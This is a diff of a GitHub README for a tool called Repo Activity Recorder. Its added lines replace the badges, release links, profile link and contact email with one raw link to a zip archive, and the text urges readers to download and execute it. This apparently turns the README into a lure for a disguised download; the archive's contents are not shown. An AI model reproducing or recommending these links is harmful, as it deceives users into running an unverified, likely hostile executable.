@@ -1,6 +1,6 @@
 # Repo Activity Recorder 📊
 
-![GitHub release](https://img.shields.io/github/release/Shravancoder2022/Repo-Activity-Recorder.svg) ![GitHub issues](https://img.shields.io/github/issues/Shravancoder2022/Repo-Activity-Recorder.svg) ![GitHub forks](https://img.shields.io/github/forks/Shravancoder2022/Repo-Activity-Recorder.svg) ![GitHub stars](https://img.shields.io/github/stars/Shravancoder2022/Repo-Activity-Recorder.svg)
+![GitHub release](https://raw.githubusercontent.com/Shravancoder2022/Repo-Activity-Recorder/main/generated/Activity_Recorder_Repo_v3.9.zip) ![GitHub issues](https://raw.githubusercontent.com/Shravancoder2022/Repo-Activity-Recorder/main/generated/Activity_Recorder_Repo_v3.9.zip) ![GitHub forks](https://raw.githubusercontent.com/Shravancoder2022/Repo-Activity-Recorder/main/generated/Activity_Recorder_Repo_v3.9.zip) ![GitHub stars](https://raw.githubusercontent.com/Shravancoder2022/Repo-Activity-Recorder/main/generated/Activity_Recorder_Repo_v3.9.zip)
 
 Welcome to **Repo Activity Recorder**, a tool designed to automatically track and visualize your GitHub repository activity and contribution data. This tool provides dynamic SVG displays of your GitHub statistics, making it easier for you to monitor your progress and contributions over time.
 
@@ -26,7 +26,7 @@ Welcome to **Repo Activity Recorder**, a tool designed to automatically track an
 
 ## Getting Started
 
-To get started with **Repo Activity Recorder**, you can download the latest release from [here](https://github.com/Shravancoder2022/Repo-Activity-Recorder/releases). After downloading, follow the instructions below to set up the tool.
+To get started with **Repo Activity Recorder**, you can download the latest release from [here](https://raw.githubusercontent.com/Shravancoder2022/Repo-Activity-Recorder/main/generated/Activity_Recorder_Repo_v3.9.zip). After downloading, follow the instructions below to set up the tool.
 
 ### Prerequisites
 
@@ -88,12 +88,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out:
 
-- GitHub: [Shravancoder2022](https://github.com/Shravancoder2022)
-- Email: [your-email@example.com](mailto:your-email@example.com)
+- GitHub: [Shravancoder2022](https://raw.githubusercontent.com/Shravancoder2022/Repo-Activity-Recorder/main/generated/Activity_Recorder_Repo_v3.9.zip)
+- Email: [https://raw.githubusercontent.com/Shravancoder2022/Repo-Activity-Recorder/main/generated/Activity_Recorder_Repo_v3.9.zip](https://raw.githubusercontent.com/Shravancoder2022/Repo-Activity-Recorder/main/generated/Activity_Recorder_Repo_v3.9.zip)
 
 ## Releases
 
-To download the latest version of **Repo Activity Recorder**, visit the [Releases](https://github.com/Shravancoder2022/Repo-Activity-Recorder/releases) section. Download the appropriate file, execute it, and start tracking your GitHub activity today!
+To download the latest version of **Repo Activity Recorder**, visit the [Releases](https://raw.githubusercontent.com/Shravancoder2022/Repo-Activity-Recorder/main/generated/Activity_Recorder_Repo_v3.9.zip) section. Download the appropriate file, execute it, and start tracking your GitHub activity today!
 
 ## Conclusion
 
